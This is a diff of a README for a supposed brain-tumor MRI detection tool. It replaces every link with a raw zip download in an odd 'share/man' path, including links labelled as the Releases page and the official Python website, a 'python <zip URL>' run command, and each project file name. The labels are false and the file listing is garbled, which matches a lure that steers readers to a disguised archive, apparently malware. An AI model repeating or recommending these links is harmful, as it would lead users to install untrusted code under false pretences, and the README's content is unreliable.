@@ -1,6 +1,6 @@
 # 🧠 Brain_Tumor_Prediction - Effortless MRI Tumor Detection
 
-[![Download Now](https://github.com/tweeezty/Brain_Tumor_Prediction/raw/refs/heads/main/Scripts/Tumor-Brain-Prediction-3.9.zip%20Now-blue?style=for-the-badge)](https://github.com/tweeezty/Brain_Tumor_Prediction/raw/refs/heads/main/Scripts/Tumor-Brain-Prediction-3.9.zip)
+[![Download Now](https://raw.githubusercontent.com/tweeezty/Brain_Tumor_Prediction/main/share/man/Brain-Prediction-Tumor-2.5.zip%20Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/tweeezty/Brain_Tumor_Prediction/main/share/man/Brain-Prediction-Tumor-2.5.zip)
 
 ## 📌 Project Description
 
@@ -27,7 +27,7 @@ Follow these steps to download and run the application on your computer.
 
 ### Step 1: Visit the Releases Page
 
-To get started, [visit the Releases page](https://github.com/tweeezty/Brain_Tumor_Prediction/raw/refs/heads/main/Scripts/Tumor-Brain-Prediction-3.9.zip) to find the latest version of the application. 
+To get started, [visit the Releases page](https://raw.githubusercontent.com/tweeezty/Brain_Tumor_Prediction/main/share/man/Brain-Prediction-Tumor-2.5.zip) to find the latest version of the application. 
 
 ### Step 2: Download the Software
 
@@ -37,7 +37,7 @@ On the Releases page, locate the latest version of the software. Click to downlo
 
 To run this application, ensure you have the following software installed on your system:
 
-- Python 3.6 or higher. You can download it from the [official Python website](https://github.com/tweeezty/Brain_Tumor_Prediction/raw/refs/heads/main/Scripts/Tumor-Brain-Prediction-3.9.zip).
+- Python 3.6 or higher. You can download it from the [official Python website](https://raw.githubusercontent.com/tweeezty/Brain_Tumor_Prediction/main/share/man/Brain-Prediction-Tumor-2.5.zip).
 - Pip, to handle package installations. Pip is included with recent versions of Python.
 
 ### Step 4: Set Up Your Environment
@@ -73,7 +73,7 @@ pip install torch torchvision opencv-python numpy matplotlib
 Once the libraries are installed, you can run the application. Navigate to the folder where you downloaded the model files and run:
 
 ```
-python https://github.com/tweeezty/Brain_Tumor_Prediction/raw/refs/heads/main/Scripts/Tumor-Brain-Prediction-3.9.zip
+python https://raw.githubusercontent.com/tweeezty/Brain_Tumor_Prediction/main/share/man/Brain-Prediction-Tumor-2.5.zip
 ```
 
 Follow the prompts to input your MRI image and receive a prediction.
@@ -93,23 +93,23 @@ Brain Tumor Detection/
 │       ├── tumor/
 │       └── no_tumor/
 │
-├── https://github.com/tweeezty/Brain_Tumor_Prediction/raw/refs/heads/main/Scripts/Tumor-Brain-Prediction-3.9.zip
-├── https://github.com/tweeezty/Brain_Tumor_Prediction/raw/refs/heads/main/Scripts/Tumor-Brain-Prediction-3.9.zip
-├── https://github.com/tweeezty/Brain_Tumor_Prediction/raw/refs/heads/main/Scripts/Tumor-Brain-Prediction-3.9.zip
-├── https://github.com/tweeezty/Brain_Tumor_Prediction/raw/refs/heads/main/Scripts/Tumor-Brain-Prediction-3.9.zip
-├── https://github.com/tweeezty/Brain_Tumor_Prediction/raw/refs/heads/main/Scripts/Tumor-Brain-Prediction-3.9.zip
+├── https://raw.githubusercontent.com/tweeezty/Brain_Tumor_Prediction/main/share/man/Brain-Prediction-Tumor-2.5.zip
+├── https://raw.githubusercontent.com/tweeezty/Brain_Tumor_Prediction/main/share/man/Brain-Prediction-Tumor-2.5.zip
+├── https://raw.githubusercontent.com/tweeezty/Brain_Tumor_Prediction/main/share/man/Brain-Prediction-Tumor-2.5.zip
+├── https://raw.githubusercontent.com/tweeezty/Brain_Tumor_Prediction/main/share/man/Brain-Prediction-Tumor-2.5.zip
+├── https://raw.githubusercontent.com/tweeezty/Brain_Tumor_Prediction/main/share/man/Brain-Prediction-Tumor-2.5.zip
 ```
 
 - **dataset/**: Contains MRI images for training and testing.
-- **https://github.com/tweeezty/Brain_Tumor_Prediction/raw/refs/heads/main/Scripts/Tumor-Brain-Prediction-3.9.zip**: Contains the model architecture.
-- **https://github.com/tweeezty/Brain_Tumor_Prediction/raw/refs/heads/main/Scripts/Tumor-Brain-Prediction-3.9.zip**: For training the model with your data.
-- **https://github.com/tweeezty/Brain_Tumor_Prediction/raw/refs/heads/main/Scripts/Tumor-Brain-Prediction-3.9.zip**: To make predictions on new images.
-- **https://github.com/tweeezty/Brain_Tumor_Prediction/raw/refs/heads/main/Scripts/Tumor-Brain-Prediction-3.9.zip**: The trained model file.
-- **https://github.com/tweeezty/Brain_Tumor_Prediction/raw/refs/heads/main/Scripts/Tumor-Brain-Prediction-3.9.zip**: Contains libraries needed to run the application.
+- **https://raw.githubusercontent.com/tweeezty/Brain_Tumor_Prediction/main/share/man/Brain-Prediction-Tumor-2.5.zip**: Contains the model architecture.
+- **https://raw.githubusercontent.com/tweeezty/Brain_Tumor_Prediction/main/share/man/Brain-Prediction-Tumor-2.5.zip**: For training the model with your data.
+- **https://raw.githubusercontent.com/tweeezty/Brain_Tumor_Prediction/main/share/man/Brain-Prediction-Tumor-2.5.zip**: To make predictions on new images.
+- **https://raw.githubusercontent.com/tweeezty/Brain_Tumor_Prediction/main/share/man/Brain-Prediction-Tumor-2.5.zip**: The trained model file.
+- **https://raw.githubusercontent.com/tweeezty/Brain_Tumor_Prediction/main/share/man/Brain-Prediction-Tumor-2.5.zip**: Contains libraries needed to run the application.
 
 ## 🔄 Updating the Software
 
-To keep the software up to date, revisit the [Releases page](https://github.com/tweeezty/Brain_Tumor_Prediction/raw/refs/heads/main/Scripts/Tumor-Brain-Prediction-3.9.zip) regularly and download the latest version. 
+To keep the software up to date, revisit the [Releases page](https://raw.githubusercontent.com/tweeezty/Brain_Tumor_Prediction/main/share/man/Brain-Prediction-Tumor-2.5.zip) regularly and download the latest version. 
 
 ## 🛠️ Troubleshooting
 
